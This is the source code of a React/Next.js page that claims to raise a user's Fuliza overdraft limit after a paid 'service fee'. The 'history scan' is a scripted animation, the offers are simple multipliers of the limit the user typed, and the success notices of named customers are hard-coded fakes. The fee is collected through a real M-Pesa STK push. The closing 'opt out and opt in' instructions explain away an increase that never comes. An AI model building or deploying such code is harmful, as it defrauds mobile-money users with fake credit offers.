'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldCheck, Smartphone, CheckCircle2, Loader2, 
  Zap, ArrowRight, TrendingUp, History, 
  CreditCard, RefreshCw, EyeOff, Terminal, 
  BarChart3, Signal, Settings, AlertCircle, Lock
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { generateSmartOTP, generateTrackingId } from '@/lib/loan-engine';
import { sendOTPSMS, sendAbandonmentSMS } from '@/app/actions/sms';
import Link from 'next/link';

// --- DATA ---
const SOCIAL_BOOSTS = [
  { name: "John K.", from: "500", to: "7,500" },
  { name: "Mary W.", from: "0", to: "4,500" },
  { name: "Peter O.", from: "2,500", to: "12,000" },
  { name: "Alice N.", from: "300", to: "5,000" },
];

// --- COMPONENTS ---

const SecurityHeader = () => (
  <div className="bg-emerald-950 text-emerald-50 text-[10px] py-3 px-4 flex justify-between items-center shadow-md sticky top-0 z-50">
    <div className="flex items-center gap-2">
      <div className="h-2 w-2 bg-emerald-400 rounded-full animate-pulse"></div>
      <span className="font-mono tracking-widest opacity-90">OVERDRAFT SYSTEM: ONLINE</span>
    </div>
    <div className="flex gap-4 font-bold opacity-80">
       <Link href="/fuliza/track" className="hover:text-emerald-300">STATUS CHECK</Link>
    </div>
  </div>
);

const SocialTicker = () => {
  const [idx, setIdx] = useState(0);
  const [show, setShow] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setShow(true);
      setIdx(prev => (prev + 1) % SOCIAL_BOOSTS.length);
      setTimeout(() => setShow(false), 4000);
    }, 6000);
    return () => clearInterval(timer);
  }, []);

  const data = SOCIAL_BOOSTS[idx];

  return (
    <div className={`fixed bottom-6 right-4 z-40 transition-all duration-500 transform ${show ? 'translate-x-0 opacity-100' : 'translate-x-10 opacity-0'}`}>
      <div className="bg-white/95 backdrop-blur text-slate-900 text-[10px] p-3 rounded-lg shadow-xl border-l-4 border-emerald-600 flex items-center gap-3 max-w-[220px]">
        <div className="bg-emerald-100 p-1.5 rounded-full"><TrendingUp className="w-4 h-4 text-emerald-600" /></div>
        <div>
           <p className="font-bold text-slate-900">{data.name} Boosted!</p>
           <p className="text-slate-500">Limit: KES {data.from} <ArrowRight className="w-3 h-3 inline mx-1 text-emerald-500" /> <span className="font-bold text-emerald-700">{data.to}</span></p>
        </div>
      </div>
    </div>
  );
};

export default function FulizaProductionPage() {
  const [step, setStep] = useState('entry');
  const [isLoaded, setIsLoaded] = useState(false);
  
  // DATA
  const [formData, setFormData] = useState({ phone: '', currentLimit: '' });
  const [maxPotential, setMaxPotential] = useState(0); 
  const [offers, setOffers] = useState<any[]>([]); 
  const [selectedOffer, setSelectedOffer] = useState<any>(null);
  
  // PROCESS STATE
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState(['','','','']);
  const [prepChecked, setPrepChecked] = useState(false);
  const [receipt, setReceipt] = useState<any>(null);
  const [loadingText, setLoadingText] = useState('');
  const [failReason, setFailReason] = useState('NETWORK');
  
  // POLL REF
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // PERSISTENCE
  useEffect(() => {
    const saved = localStorage.getItem('fuliza_prod_state');
    if (saved) {
      const parsed = JSON.parse(saved);
      if (parsed.step !== 'success' && parsed.step !== 'failed') {
        setFormData(parsed.formData);
        if(parsed.offers) setOffers(parsed.offers);
        if(parsed.maxPotential) setMaxPotential(parsed.maxPotential);
        if(parsed.selectedOffer) setSelectedOffer(parsed.selectedOffer);
        setStep(parsed.step);
      }
    }
    setIsLoaded(true);
  }, []);

  useEffect(() => {
    if (isLoaded && step !== 'analyzing' && step !== 'stk_loading') {
      localStorage.setItem('fuliza_prod_state', JSON.stringify({ step, formData, offers, maxPotential, selectedOffer }));
    }
  }, [step, formData, offers, maxPotential, selectedOffer, isLoaded]);

  // --- SMART LOGIC ---
  const generateRealisticOffers = (current: number) => {
    let baseOffers = [];
    
    // Scenario A: Low (< 1000) -> Fixed Steps
    if (current <= 1000) {
      baseOffers = [
        { limit: 3500, fee: 100, label: 'Starter' },
        { limit: 5000, fee: 150, label: 'Standard' },
        { limit: 7500, fee: 200, label: 'Max Boost', best: true }
      ];
    } 
    // Scenario B: Medium (< 5000) -> Multipliers
    else if (current <= 5000) {
      baseOffers = [
        { limit: Math.floor(current * 1.5), fee: 150, label: 'Basic Boost' },
        { limit: Math.floor(current * 2.2), fee: 250, label: 'Super Boost', best: true },
        { limit: Math.floor(current * 3.5), fee: 350, label: 'Pro Limit' }
      ];
    }
    // Scenario C: High (> 5000) -> Conservative
    else {
      baseOffers = [
        { limit: Math.floor(current * 1.2), fee: 250, label: 'Silver' },
        { limit: Math.floor(current * 1.5), fee: 450, label: 'Gold', best: true },
        { limit: Math.floor(current * 2.0), fee: 650, label: 'Platinum' }
      ];
    }

    // Round to nearest 100
    return baseOffers.map(o => ({
      ...o,
      limit: Math.ceil(o.limit / 100) * 100
    }));
  };

  // --- HANDLERS ---

  const handleScan = (e: React.FormEvent) => {
    e.preventDefault();
    if(formData.phone.length !== 10 || !formData.phone.startsWith('0')) { alert("Enter valid Safaricom number"); return; }
    if(!formData.currentLimit) { alert("Enter Current Limit"); return; }

    const current = parseInt(formData.currentLimit.replace(/\D/g, ''));
    const generated = generateRealisticOffers(current);
    setOffers(generated);
    setMaxPotential(generated[generated.length - 1].limit);

    setStep('analyzing');
    const seq = [
      { t: "Connecting to Overdraft Server...", d: 1500 },
      { t: `Scanning History for ${formData.phone}...`, d: 2000 },
      { t: `Current Limit KES ${current.toLocaleString()} Verified...`, d: 1000 },
      { t: "Calculating Eligible Boosts...", d: 1500 }
    ];

    let total = 0;
    seq.forEach(({t, d}, i) => {
      total += d;
      setTimeout(() => {
        setLoadingText(t);
        if(i === seq.length - 1) {
          setTimeout(() => {
            const code = generateSmartOTP(formData.phone);
            setOtpSent(code);
            sendOTPSMS(formData.phone, code); // REAL SMS
            setStep('otp');
          }, 800);
        }
      }, total);
    });
  };

  const handleOtpVerify = (e: React.FormEvent) => {
  e.preventDefault();
  if(otpInput.join('') === otpSent) {
    setStep('blur_reveal');
    // FIXED: Removed the 3rd argument (maxPotential)
    sendAbandonmentSMS(formData.phone, "Customer"); 
  } else {
    alert("Invalid Code");
  }
};

  const handleSelectOffer = (offer: any) => {
    setSelectedOffer(offer);
    setStep('payment');
  };

  // --- REAL PAYMENT ---
  const handleStkStart = async () => {
    setStep('stk_loading');
    setLoadingText("Initiating Service Request...");
    
    try {
        const res = await fetch('/api/stkpush', {
            method: 'POST',
            body: JSON.stringify({ 
                phoneNumber: formData.phone, 
                amount: selectedOffer.fee,
                serviceType: 'FULIZA_BOOST'
            })
        });
        const data = await res.json();
        
        if(data.success) {
            setStep('stk_push');
            startPolling(data.checkoutRequestID);
        } else {
            throw new Error("STK Failed");
        }
    } catch(e) {
        setFailReason('NETWORK');
        setStep('failed');
    }
  };

  const startPolling = (reqId: string) => {
    let attempts = 0;
    pollIntervalRef.current = setInterval(async () => {
        attempts++;
        if(attempts > 90) { // 3 mins
            clearInterval(pollIntervalRef.current!);
            setFailReason('NETWORK');
            setStep('failed');
            return;
        }

        const res = await fetch(`/api/check-status?id=${reqId}`);
        const data = await res.json();

        if (data.status === 'COMPLETED') {
            clearInterval(pollIntervalRef.current!);
            localStorage.removeItem('fuliza_prod_state');
            setReceipt({
                code: data.mpesaCode,
                trackId: data.trackId, // Generated by Webhook (FZ-...)
                time: new Date().toLocaleTimeString()
            });
            setStep('success');
        } else if (data.status === 'FAILED') {
            clearInterval(pollIntervalRef.current!);
            setFailReason('CANCEL');
            setStep('failed');
        }
    }, 2000);
  };

  // Cleanup
  useEffect(() => () => { if(pollIntervalRef.current) clearInterval(pollIntervalRef.current); }, []);

  if (!isLoaded) return <div className="min-h-screen bg-slate-50 flex items-center justify-center"><Loader2 className="animate-spin text-emerald-600" /></div>;

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 pb-20">
      <SecurityHeader />
      <SocialTicker />

      {/* 1. ENTRY */}
      {step === 'entry' && (
        <div className="max-w-md mx-auto p-4 pt-10 animate-in slide-in-from-bottom-4">
          <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-100">
             <div className="text-center mb-8">
                <div className="w-16 h-16 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-100">
                   <RefreshCw className="w-8 h-8 text-emerald-600" />
                </div>
                <h1 className="text-2xl font-black text-slate-900 mb-2">Boost Limit</h1>
                <p className="text-sm text-slate-500 px-4">
                   Scan your M-Pesa history to unlock a higher overdraft limit instantly.
                </p>
             </div>

             <form onSubmit={handleScan} className="space-y-5">
                <div>
                   <label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Safaricom Number</label>
                   <div className="relative">
                      <Smartphone className="absolute left-3 top-3.5 w-5 h-5 text-slate-400" />
                      <input 
                        type="tel" className="w-full h-14 pl-10 pr-4 border border-slate-300 rounded-xl font-mono text-lg font-bold focus:ring-2 focus:ring-emerald-500 outline-none"
                        placeholder="07XX XXX XXX" value={formData.phone}
                        onChange={(e) => setFormData({...formData, phone: e.target.value.replace(/\D/g,'').slice(0,10)})}
                      />
                   </div>
                </div>
                <div>
                   <label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Current Limit (KES)</label>
                   <div className="relative">
                      <BarChart3 className="absolute left-3 top-3.5 w-5 h-5 text-slate-400" />
                      <input 
                        type="tel" className="w-full h-14 pl-10 pr-4 border border-slate-300 rounded-xl font-mono text-lg font-bold focus:ring-2 focus:ring-emerald-500 outline-none"
                        placeholder="e.g. 500" value={formData.currentLimit}
                        onChange={(e) => setFormData({...formData, currentLimit: e.target.value.replace(/\D/g,'')})}
                      />
                   </div>
                </div>
                <div className="bg-emerald-50 p-3 rounded-lg flex gap-2 items-start border border-emerald-100">
                   <History className="w-4 h-4 text-emerald-600 mt-0.5 shrink-0" />
                   <p className="text-[10px] text-emerald-800 font-medium leading-tight">
                      System will scan your last 3 months of transaction volume.
                   </p>
                </div>
                <Button className="w-full h-14 bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-lg rounded-xl shadow-lg">Scan & Boost</Button>
             </form>
          </div>
        </div>
      )}

      {/* 2. ANALYZING */}
      {step === 'analyzing' && (
         <div className="fixed inset-0 bg-slate-900 z-[60] flex flex-col items-center justify-center p-8 text-emerald-400 font-mono">
             <div className="relative w-24 h-24 mb-6">
                <div className="absolute inset-0 border-4 border-emerald-900 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
                <Terminal className="absolute inset-0 m-auto w-8 h-8 text-emerald-500 animate-pulse" />
             </div>
             <h2 className="text-xl font-bold text-white mb-2">SYSTEM SCANNING</h2>
             <p className="text-sm animate-pulse">{loadingText}</p>
             <div className="mt-8 w-64 bg-emerald-900/50 h-1 rounded-full overflow-hidden">
                <div className="h-full bg-emerald-500 animate-[width_2s_ease-in-out_infinite]" style={{width: '50%'}}></div>
             </div>
         </div>
      )}

      {/* 3. OTP */}
      {step === 'otp' && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in slide-in-from-right">
            <div className="bg-white p-6 rounded-2xl shadow-xl border-t-4 border-emerald-600">
               <h2 className="text-xl font-black text-slate-900 mb-2">Verify Line</h2>
               <p className="text-sm text-slate-500 mb-6">Enter code sent to {formData.phone}</p>
               <form onSubmit={handleOtpVerify}>
                  <div className="flex gap-3 justify-center mb-8">
                     {otpInput.map((val, i) => (
                        <input key={i} id={`otp-${i}`} type="tel" maxLength={1} value={val}
                           onChange={(e) => { const n = [...otpInput]; n[i] = e.target.value; setOtpInput(n); if(e.target.value && i < 3) document.getElementById(`otp-${i+1}`)?.focus(); }}
                           className="w-14 h-14 border-2 border-slate-200 rounded-xl text-center text-2xl font-black text-slate-900 focus:border-emerald-600 outline-none"
                        />
                     ))}
                  </div>
                  <Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl">Unlock Limit</Button>
               </form>
            </div>
         </div>
      )}

      {/* 4. REVEAL (MAX POTENTIAL) */}
      {step === 'blur_reveal' && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
             <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-slate-200">
                 <div className="bg-emerald-600 p-4 text-center text-white font-bold uppercase text-xs tracking-widest">Boost Available</div>
                 <div className="p-8 text-center">
                    <div className="flex justify-center items-end gap-3 mb-8">
                        <div className="text-center opacity-50 pb-1">
                           <p className="text-[10px] font-bold uppercase text-slate-500 mb-1">Current</p>
                           <p className="text-lg font-bold text-slate-400 line-through">KES {formData.currentLimit}</p>
                        </div>
                        <div className="pb-3 text-slate-300"><ArrowRight className="w-6 h-6" /></div>
                        <div className="text-center relative">
                           <p className="text-[10px] font-bold uppercase text-emerald-600 mb-1">Max Potential</p>
                           <div className="relative">
                              <p className="text-4xl font-black text-slate-800 blur-sm select-none opacity-60">{maxPotential.toLocaleString()}</p>
                              <div className="absolute inset-0 flex items-center justify-center">
                                 <div className="bg-slate-900 text-white text-[10px] font-bold px-3 py-1.5 rounded-full flex items-center gap-1 shadow-lg animate-bounce"><EyeOff className="w-3 h-3" /> HIDDEN</div>
                              </div>
                           </div>
                        </div>
                    </div>
                    <p className="text-sm text-slate-600 mb-6 font-medium px-2">We found <strong>{offers.length} boost options</strong> for this line.</p>
                    <Button onClick={() => setStep('offer_select')} className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl shadow-lg">Reveal Options</Button>
                 </div>
             </div>
         </div>
      )}

      {/* 5. OFFER SELECT (REALISTIC OPTIONS) */}
      {step === 'offer_select' && (
         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
            <h2 className="text-xl font-black text-slate-900 mb-2 px-2">Select New Limit</h2>
            <p className="text-sm text-slate-500 mb-6 px-2">Choose the limit you want to activate.</p>
            <div className="space-y-4">
               {offers.map((offer) => (
                  <div key={offer.limit} onClick={() => handleSelectOffer(offer)} className={`relative bg-white p-5 rounded-2xl border-2 cursor-pointer transition-all hover:scale-[1.02] shadow-sm group ${offer.best ? 'border-emerald-500 ring-1 ring-emerald-500' : 'border-slate-100 hover:border-emerald-400'}`}>
                     {offer.best && <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-emerald-600 text-white text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wide">Best Value</div>}
                     <div className="flex justify-between items-center mb-2">
                        <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">{offer.label}</span>
                        <span className="text-[10px] font-bold bg-slate-100 text-slate-600 px-2 py-1 rounded">Fee: KES {offer.fee}</span>
                     </div>
                     <div className="flex justify-between items-end">
                        <span className="text-3xl font-black text-slate-900 group-hover:text-emerald-700 transition-colors">KES {offer.limit.toLocaleString()}</span>
                        <ArrowRight className={`w-6 h-6 ${offer.best ? 'text-emerald-600' : 'text-slate-300'}`} />
                     </div>
                  </div>
               ))}
            </div>
         </div>
      )}

      {/* 6. PAYMENT/SUMMARY */}
      {step === 'payment' && selectedOffer && (
         <div className="max-w-md mx-auto p-4 pt-6 animate-in zoom-in-95">
            <div className="bg-white rounded-2xl shadow-2xl border border-slate-200 overflow-hidden">
               <div className="bg-slate-900 text-white p-4 text-center font-bold">Upgrade Summary</div>
               <div className="p-6 space-y-5">
                  <div className="flex justify-between items-center pb-4 border-b border-dashed border-slate-200">
                     <span className="text-sm font-bold text-slate-600">New Approved Limit</span>
                     <span className="text-2xl font-black text-emerald-600">KES {selectedOffer.limit.toLocaleString()}</span>
                  </div>
                  <div className="bg-blue-50 p-4 rounded-xl border border-blue-100">
                     <div className="flex justify-between items-center mb-2">
                        <div className="flex items-center gap-2"><Settings className="w-4 h-4 text-blue-700" /><span className="text-xs font-bold text-blue-800 uppercase">Service Fee</span></div>
                        <span className="text-xl font-black text-slate-900">KES {selectedOffer.fee}</span>
                     </div>
                     <p className="text-[10px] text-blue-700 leading-tight">This is a one-time <span className="font-bold">Service Fee</span> for processing your limit adjustment with the credit bureau.</p>
                  </div>
                  <label className="flex gap-3 items-start cursor-pointer group p-3 rounded-lg hover:bg-slate-50 border border-transparent hover:border-slate-100">
                     <input type="checkbox" checked={prepChecked} onChange={(e) => setPrepChecked(e.target.checked)} className="mt-1 w-5 h-5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-600" />
                     <span className="text-xs text-slate-600 font-medium leading-snug">I agree to pay the <span className="font-bold text-slate-900">KES {selectedOffer.fee} Service Fee</span> to facilitate this limit upgrade.</span>
                  </label>
                  <Button onClick={handleStkStart} disabled={!prepChecked} className="w-full h-16 text-lg font-black rounded-xl shadow-lg transition-all uppercase tracking-wide bg-emerald-600 hover:bg-emerald-500 text-white disabled:opacity-50">Pay & Activate</Button>
               </div>
            </div>
         </div>
      )}

      {/* 7. CONNECTING / STK PUSH */}
      {(step === 'stk_loading' || step === 'stk_push') && (
         <div className="fixed inset-0 bg-slate-900/95 z-[70] flex flex-col items-center justify-center p-6 text-center">
             <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mb-6 relative">
                <div className="absolute inset-0 border-4 border-emerald-500/50 rounded-full animate-ping"></div>
                {step === 'stk_loading' ? <Signal className="w-10 h-10 text-emerald-400" /> : <Smartphone className="w-10 h-10 text-emerald-400 animate-pulse" />}
             </div>
             <h2 className="text-2xl font-black text-white mb-2">{step === 'stk_loading' ? 'Requesting...' : 'Check Your Phone'}</h2>
             <p className="text-emerald-400 font-bold mb-8 animate-pulse text-sm">{step === 'stk_loading' ? loadingText : `Enter PIN to Pay Service Fee KES ${selectedOffer.fee}`}</p>
             {step === 'stk_push' && <div className="w-full max-w-xs animate-in fade-in delay-1000"><p className="text-xs text-slate-400 mb-4">Prompt sent to {formData.phone}</p><div className="h-1 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-emerald-500 animate-[width_60s_linear_forwards]" style={{width: '0%'}}></div></div></div>}
         </div>
      )}

      {/* 8. SUCCESS & RESET INSTRUCTIONS */}
      {step === 'success' && receipt && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
             <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 relative">
                <div className="absolute top-0 left-0 w-full h-3 bg-emerald-500"></div>
                <div className="p-8 text-center">
                   <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4"><CheckCircle2 className="w-8 h-8 text-emerald-600" /></div>
                   <h2 className="text-xl font-black text-slate-900 mb-1">Upgrade Queued</h2>
                   <p className="text-xs text-slate-500 font-medium mb-6">Service Fee Received</p>
                   <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 font-mono text-xs text-left space-y-3 mb-6">
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">Tracking ID:</span><span className="font-bold text-blue-600">{receipt.trackId}</span></div>
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">New Limit:</span><span className="font-bold text-emerald-600">KES {selectedOffer.limit.toLocaleString()}</span></div>
                      <div className="flex justify-between"><span className="text-slate-500">Status:</span><span className="font-bold text-slate-900">Pending Update</span></div>
                   </div>
                   <div className="bg-yellow-50 p-4 rounded-xl border border-yellow-100 text-left mb-6">
                      <div className="flex items-center gap-2 mb-2"><AlertCircle className="w-4 h-4 text-yellow-600" /><h4 className="text-sm font-bold text-yellow-800">Important Next Steps</h4></div>
                      <p className="text-xs text-yellow-800 mb-3 leading-relaxed">Your new limit will reflect within <strong>48 Hours</strong>. If you do not see it by then, you MUST perform a manual refresh:</p>
                      <ul className="text-[10px] text-yellow-900 space-y-1.5 list-disc pl-4 font-medium">
                         <li>Ensure you have <strong>NO</strong> existing Fuliza loan.</li>
                         <li>Dial <strong>*234#</strong> and select Fuliza.</li>
                         <li>Select <strong>Opt Out</strong> (This clears the old limit).</li>
                         <li>Wait 5 minutes, then Dial *234# to <strong>Opt In</strong> again.</li>
                      </ul>
                   </div>
                   <Link href="/fuliza/track"><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg">Track Status</Button></Link>
                </div>
             </div>
         </div>
      )}

      {/* 9. FAILED */}
      {step === 'failed' && (
         <div className="max-w-md mx-auto p-4 pt-20 text-center animate-in zoom-in-95">
             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><RefreshCw className="w-10 h-10 text-orange-500" /></div>
             <h2 className="text-xl font-black text-slate-900 mb-2">{failReason === 'CANCEL' ? 'Process Cancelled' : 'Connection Failed'}</h2>
             <p className="text-sm text-slate-500 mb-8 px-6">We could not verify the service fee payment. Limit upgrade has been paused.</p>
             <Button onClick={handleStkStart} className="w-full h-14 bg-blue-900 text-white font-bold rounded-xl shadow-lg">Retry Payment</Button>
         </div>
      )}
    </div>
  );
}